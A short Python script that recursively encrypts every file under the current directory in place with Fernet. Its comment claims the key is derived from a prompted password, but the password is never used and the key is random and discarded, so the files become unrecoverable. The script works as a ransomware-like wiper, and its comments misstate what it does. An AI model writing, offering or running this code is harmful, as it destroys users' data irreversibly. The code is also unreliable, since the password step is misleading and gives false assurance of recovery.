import os
from cryptography.fernet import Fernet
import getpass

# Prompt the user for a password
password = getpass.getpass("Enter the encryption password: ")

# Generate a key from the password
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Get the current working directory
current_directory = os.getcwd()

def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        file_data = file.read()

    encrypted_data = cipher_suite.encrypt(file_data)

    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

def encrypt_directory(directory_path):
    for root, _, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path)
            print(f"Encrypted: {file_path}")

# Encrypt files in the current directory and subdirectories
encrypt_directory(current_directory)

print("Encryption complete.")
